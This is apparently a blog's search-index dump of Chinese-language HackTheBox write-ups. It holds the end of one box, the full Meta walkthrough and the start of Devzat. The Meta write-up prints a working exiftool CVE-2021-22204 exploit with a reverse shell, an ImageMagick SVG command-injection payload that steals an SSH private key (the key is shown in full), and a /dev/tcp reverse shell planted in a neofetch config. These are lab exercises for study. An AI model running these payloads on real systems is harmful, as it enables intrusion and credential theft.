[https://gchq.github.io/CyberChef/#recipe=Swap\\_endianness('Hex',31,true)From\\_Hex('Auto')XOR({'option':'Hex','string':'96'},'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg)\n\nè¿™æ˜¯æœ€ç»ˆæ”¹å‡ºæ¥çš„æ•ˆæœï¼Œç‚¹å¼€å³å¯çœ‹åˆ°æˆ‘çš„ç»“æœ\n\n```bash\n0xa5\n0xa9f4\n0xbcf0b5e3\n0xb2d6f4a0fda0b3d6\n0xfdb3d6e7\n0xf7bbfdc8\n0xa4b3a3f3\n0xf0e7abd6\n```\n```bash\n@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3\n```\nå¾—åˆ°äº†backdoorçš„å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh root@10.10.11.146                                   \nThe authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.\nECDSA key fingerprint is SHA256:2jPT4mThqEcnA/qjjQsIWwy2QNwGObWQX5MjK5YNvCM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.146' (ECDSA) to the list of known hosts.\nroot@10.10.11.146's password: \nLast login: Fri Feb 25 12:56:49 2022 from 10.10.14.76\nroot@production:~# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ°root\n\n```bash\nroot@production:~# ls\nroot.txt\nroot@production:~# cat root.txt \n4a243e1e3ccb05dbcd7a29abb49d3bcf\n```\næˆåŠŸæ‹¿åˆ°rootçš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Meta - Hackthebox","url":"/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/","content":"\n# Hackthebox - Meta\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Meta/3c4a18f1-9183-44ce-a29e-4c4f4c25a371.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Meta/32030297-7f11-4cff-9252-ef4e42fb962e.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 21:46 EST\nNmap scan report for 10.10.11.140\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)\n|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)\n|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)\n80/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: Did not follow redirect to http://artcorp.htb\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=40520%PV=Y%DS=2%DC=T%G=Y%TM=6211ABB\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   222.35 ms 10.10.14.1\n2   222.43 ms 10.10.11.140\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.02 seconds\n```\n### Http\nè¿›å…¥80ç«¯å£ä¼šè‡ªåŠ¨è·³è½¬åˆ°artcorp.htbï¼Œå…ˆåŠ å…¥åˆ°hosts\n\n```bash\necho 10.10.11.140 artcorp.htb >> /etc/hosts\n```\n![](Hackthebox-Meta/a47ef151-9c4c-4802-a117-2d6c6a919240.png)\n\nçœ‹æ ·å­æ˜¯ä¸€å®¶è‰ºæœ¯å…¬å¸ï¼Œè¿›æ¥åæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå…ˆfuzzä¸€ä¸‹ç›®å½•çœ‹çœ‹å§\n\n### Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://artcorp.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://artcorp.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nassets                  [Status: 301, Size: 234, Words: 14, Lines: 8]\ncss                     [Status: 301, Size: 231, Words: 14, Lines: 8]\nserver-status           [Status: 403, Size: 199, Words: 14, Lines: 8]\n                        [Status: 200, Size: 4427, Words: 1663, Lines: 87]\n:: Progress: [20116/20116] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:54] :: Errors: 0 ::\n```\nä¹Ÿæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»fuzzä¸€ä¸‹å­åŸŸåçœ‹çœ‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.artcorp.htb\"  -mc 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://artcorp.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.artcorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\ndev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]\n:: Progress: [4989/4989] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:32] :: Errors: 0 ::\n```\næœ‰ä¸€ä¸ªdev01ï¼ŒåŠ å…¥åˆ°hosts\n\n```bash\necho 10.10.11.140 dev01.artcorp.htb >> /etc/hosts\n```\n![](Hackthebox-Meta/bd696eb1-b9e8-4361-a8f1-7fab5b43ce99.png)\n\n### Uploads\nçœ‹ä¸å¤ªæ‡‚æœ‰ä»€ä¹ˆç”¨ï¼Œå…ˆç‚¹ç‚¹çœ‹çœ‹å§\n\n![](Hackthebox-Meta/7c68501a-fcb2-4b69-87d0-3a8c3cee3e04.png)\n\nè¿™è¾¹æ˜¯ä¸€ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ ä¸€ä¸ªshellè¯•è¯•\n\n![](Hackthebox-Meta/aaa7a0ae-161d-4559-bca9-363e7148e9d4.png)\n\næç¤ºåªèƒ½ä¸Šä¼ jpgå’Œpngæ ¼å¼çš„æ–‡ä»¶ï¼Œé‚£å°±éšä¾¿æ‹¿å¼ å›¾è¯•è¯•å§\n\n![](Hackthebox-Meta/4fd9c1c1-0e61-420c-9149-7e0f27b1019d.png)\n\nè¿™é‡Œåˆ—å‡ºäº†å›¾ç‰‡çš„å±æ€§ä¿¡æ¯ï¼Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯å›¾ç‰‡éšå†™æˆ–è€…exiftoolçš„cveæ¼æ´ä¹‹ç±»çš„\n\næœ¬åœ°ä½¿ç”¨exiftoolè¿›è¡Œç¡®è®¤ä¸€ä¸‹\n\n![](Hackthebox-Meta/5b3a584c-11fe-44b9-a6c1-f8d706684b30.png)\n\nå¯ä»¥å¯¹ä¸Šï¼Œæ˜¯exiftoolæ— ç–‘äº†ï¼Œå»æœç´¢ä¸€ä¸‹exiftoolçš„æ¼æ´\n\n### æ¼æ´åˆ©ç”¨\n![](Hackthebox-Meta/bc0134a4-f6b6-40b2-a08c-0c17677d05f2.png)\n\nå‘ç°ä¸€ä¸ªå¯ç”¨çš„æ¼æ´\n\n> [https://github.com/convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)\n\nä¸‹è½½ä¸‹æ¥åå°†IPå’Œç«¯å£ä¿®æ”¹ä¸ºè‡ªå·±çš„\n\n```bash\n#!/bin/env python3\n\nimport base64\nimport subprocess\n\nip = '10.10.14.16'\nport = '4444'\n\npayload = b\"(metadata \\\"\\c${use MIME::Base64;eval(decode_base64('\"\n\npayload = payload + base64.b64encode( f\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};\".encode() )\n\npayload = payload + b\"'))};\\\")\"\n\npayload_file = open('payload', 'w')\npayload_file.write(payload.decode('utf-8'))\npayload_file.close()\n\nsubprocess.run(['bzz', 'payload', 'payload.bzz'])\nsubprocess.run(['djvumake', 'exploit.djvu', \"INFO=1,1\", 'BGjp=/dev/null', 'ANTz=payload.bzz'])\nsubprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])\n```\nç„¶åæ‰§è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/CVE-2021-22204-exiftool]\nâ””â”€# python3 exploit.py                          \n    1 image files updated\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/CVE-2021-22204-exiftool]\nâ””â”€# ls    \nconfigfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz  README.md\n```\nç”Ÿæˆå‡ºæ¥çš„image.jpgå°±æ˜¯æˆ‘ä»¬çš„shelläº†ï¼Œæ‹¿å»ä¸Šä¼ åˆ°webé‡Œ\n\nç„¶åæœ¬åœ°è¿è¡Œä¸€ä¸ªncç›‘å¬ç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Meta/c9bec073-a3ec-4f05-9003-035441d87cd7.png)\n\né€‰æ‹©åæ‰§è¡Œå³å¯\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39314\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nbash-5.0$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell\n\n```bash\nCtrl+Zè¿”å›\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n## æƒé™æå‡\n### User\nåœ¨/home/thomasä¸­çœ‹åˆ°æœ‰.sshæ–‡ä»¶å¤¹\n\nè¿›å…¥.sshæ–‡ä»¶å¤¹æ‹¿keyï¼Œä½†æ˜¯å‘ç°æ²¡æƒé™\n\n```bash\nbash-5.0$ find /usr/ -type f -newermt '2022-01-01' -ls\n   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh\n```\næŸ¥æ‰¾ä¸€ä¸‹ä»2022-01-01å¼€å§‹åˆ›å»ºçš„æ–°æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªshè„šæœ¬\n\næˆ–æ˜¯è¿è¡Œpspy64ä¹Ÿå¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬\n\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\n#!/bin/bash\ncd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null\npkill mogrify\n```\nè¿™é‡Œmogrifyåªæ˜¯ä¸€ä¸ªç®€å•çš„è„šæœ¬ï¼Œä½¿ç”¨ImageMgickçš„mogrifyå°†å‘ç°çš„æ–‡ä»¶è½¬æ¢ä¸ºpng\n\n```bash\nbash-5.0$ /usr/local/bin/mogrify -version\nVersion: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org\nCopyright: Â© 1999-2020 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5) \nDelegates (built-in): fontconfig freetype jng jpeg png x xml zlib\n```\n> [https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)\n\næœ‰ä¸€ä¸ªç›¸å…³æ¼æ´\n\nç”Ÿæˆä¸€ä¸ªpoc.svg\n\n```bash\n<image authenticate='ff\" `echo $(id)> /dev/shm/0wned`;\"'>\n  <read filename=\"pdf:/etc/passwd\"/>\n  <get width=\"base-width\" height=\"base-height\" />\n  <resize geometry=\"400x400\" />\n  <write filename=\"test.png\" />\n  <svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">       \n  <image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/>\n  </svg>\n</image>\n```\næµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥ä»¥thomasçš„èº«ä»½æ‰§è¡Œå‘½ä»¤\n\n```bash\ncp poc.svg /var/www/dev01.artcorp.htb/convert_images/\n\nbash-5.0$ ls -la\ntotal 12\ndrwxrwxrwt  2 root     root      100 Feb 21 23:53 .\ndrwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..\n-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned\n-rw-r--r--  1 www-data www-data  406 Feb 21 23:52 poc.svg\nbash-5.0$ cat 0wned \nuid=1000(thomas) gid=1000(thomas) groups=1000(thomas)\n```\nç¡®è®¤å¯ä»¥ä»¥thomasçš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œå’±ä»¬ä¿®æ”¹ä¸€ä¸‹pocçš„ç¬¬ä¸€å¥ï¼Œç”¨thomasçš„æƒé™æŠŠsshçš„keyç»™æ‹¿å‡ºæ¥\n\n```bash\n<image authenticate='ff\" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;\"'>\n```\nç„¶åå†æ‰§è¡Œä¸€æ¬¡\n\n```bash\nbash-5.0$ ls -la\ntotal 16\ndrwxrwxrwt  2 root     root      120 Feb 21 23:58 .\ndrwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..\n-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned\n-rw-r--r--  1 thomas   thomas   2590 Feb 21 23:58 id_rsa\n-rw-r--r--  1 www-data www-data  422 Feb 21 23:56 poc.svg\n```\nå·²ç»å‚¨å­˜è¿‡æ¥äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\n\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\nbhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=\n-----END OPENSSH PRIVATE KEY-----\n\n```\næˆåŠŸæ‹¿åˆ°thomasçš„keyï¼Œç°åœ¨ä¿å­˜åˆ°æœ¬åœ°id\\_rsaåç»™ä»–600çš„æƒé™\n\n```bash\nchmod 600 id_rsa\n```\nç„¶åä½¿ç”¨sshè¿›è¡Œè¿æ¥\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh thomas@artcorp.htb -i id_rsa \nLinux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Feb 21 15:30:44 2022 from 10.10.14.147\n-bash-5.0$ whoami&&id\nthomas\nuid=1000(thomas) gid=1000(thomas) groups=1000(thomas)\n```\n```bash\n-bash-5.0$ ls\nuser.txt\n-bash-5.0$ cat user.txt \n9e36bb6959f1ba118cfe71b928ac66b6\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n### Root\n```bash\n-bash-5.0$ sudo -l\nMatching Defaults entries for thomas on meta:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME\n\nUser thomas may run the following commands on meta:\n    (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"\n```\nsudo -lçœ‹åˆ°æœ‰ä¸€ä¸ªå¯ä»¥rootæƒé™æ‰§è¡Œçš„neofetch\n\n> [https://gtfobins.github.io/gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/)\n\nè¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªææƒç›¸å…³çš„\n\nä½†æ˜¯æœ‰ä¸€ç‚¹ä¸ä¸€æ ·ï¼Œè¿™é‡Œçš„æƒé™åªèƒ½ä½¿ç”¨æŒ‡å®šå‚æ•°\n\nä½†æ˜¯ä¼šä¿ç•™XDG\\_CONFIG\\_HOMEçš„ç¯å¢ƒå˜é‡\n\nç„¶åå½“å‰ç”¨æˆ·çš„neofetché…ç½®æ–‡ä»¶å¯æ§\n\nç°åœ¨æŒ‰ç…§è¿™ä¸ªæ€è·¯æ¥æ“ä½œå§\n\n```bash\n-bash-5.0$ cd ~/.config/neofetch/\n-bash-5.0$ ls -la\ntotal 24\ndrwxr-xr-x 2 thomas thomas  4096 Feb 21 13:32 .\ndrwxr-xr-x 3 thomas thomas  4096 Aug 30 13:01 ..\n-rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf\n```\n1. åœ¨config.confçš„ç¬¬ä¸€è¡Œæ·»åŠ ä¸€ä¸ªåå‘shell\n\n```bash\n/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1\"\n```\n1. å°†thomas.configå¯¼å‡ºåˆ°åŸºæœ¬é…ç½®ç¯å¢ƒè·¯å¾„\n\n```bash\nexport XDG_CONFIG_HOME=\"$HOME/.config\"\n```\n1. åœ¨æœ¬åœ°å¯ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n1. ä»¥rootæƒé™æ‰§è¡Œneofetchæ–‡ä»¶\n\n```bash\nsudo -u root /usr/bin/neofetch \\\"\\\"\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39366\nroot@meta:/home/thomas/.config/neofetch# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾—rootæƒé™\n\n```bash\nroot@meta:/home/thomas/.config/neofetch# cd /root\ncd /root\nroot@meta:~# ls\nls\nconf\nroot.txt\n\ncat root.txt\nf3f5e2ad459dbd8842f813bec23889f0\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Devzat - Hackthebox","url":"/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/","content":"\n# Hackthebox - Devzat\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Devzat/afd4673b-eefd-4e1a-8aa5-9e0aa2ce21fb.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Devzat/aa4fdde1-b932-4085-a9e1-47aec6593959.png)\n\n## ä¿¡æ¯æœé›†\n### Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:18 EST\nNmap scan report for devzat.htb (10.10.11.118)\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)\n|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)\n|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: devzat - where the devs at\n8000/tcp open  ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-Go\n| ssh-hostkey: \n|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.91%I=7%D=2/19%Time=6210A7FD%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,C,\"SSH-2\\.0-Go\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 